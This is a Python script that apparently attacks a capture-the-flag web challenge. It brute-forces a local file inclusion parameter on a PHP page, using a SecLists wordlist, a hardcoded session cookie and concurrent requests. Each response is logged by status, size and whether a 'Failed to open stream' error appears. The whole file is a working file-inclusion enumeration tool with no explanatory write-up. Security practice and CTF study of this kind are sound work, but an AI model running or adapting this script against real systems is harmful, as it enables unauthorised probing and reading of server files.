import requests
from bs4 import BeautifulSoup
import concurrent.futures
import logging

logging.basicConfig(filename='lfi_useless_requests.log', level=logging.INFO, format='%(message)s')

def send_lfi(method):
    url = "https://challenge-headmind.rslab.ovh:8888/confirmcode.php"
    params = {"method": method}
    headers = {
        "Host": "challenge-headmind.rslab.ovh:8888",
        "Cookie": "PHPSESSID=nu32q6tmcf3q8m2dcb6gmaijch",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers",
        "Connection": "keep-alive"
    }
    try:
        r = requests.get(url, headers=headers, params=params, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        form_divs = soup.find_all('div', class_='form')
        form_texts = [div.get_text(strip=True) for div in form_divs]
        logging.info(f"{method} - {r.status_code} - {len(r.content)} - {'Failed to open stream' in r.text} - {'|'.join([e for e in form_texts if e != ''])}")
    except requests.RequestException as e:
        logging.info(f"Erreur lors de la requête avec la méthode {method} : {e}")

if __name__ == "__main__":
    
    methods = []
    
    with open("Outils/SecLists/Discovery/Web-Content/big.txt", 'r') as f:
        lines = f.readlines()
        
    for line in lines:
        methods.append('useless\\'+ line.strip() + '.txt')
        methods.append('useless\\'+ line.strip() + '.php')
        methods.append('useless\\'+ line.strip() + '.html')
        methods.append('useless\\'+ line.strip() + '.png')
        
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(send_lfi, methods)